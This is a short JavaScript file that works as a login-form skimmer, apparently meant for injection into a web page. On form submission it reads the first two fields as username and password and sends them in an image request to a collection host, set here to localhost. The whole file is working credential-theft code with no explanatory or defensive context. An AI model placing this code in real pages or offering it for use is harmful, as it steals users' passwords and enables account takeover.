const link = "http://localhost";

function interceptForm() {
    let username = document.forms[0].elements[0].value;
    let password = document.forms[0].elements[1].value;
    new Image().src = `${link}/?username=${username}+&password=${password}`;
}

document.forms[0].onsubmit = interceptForm;
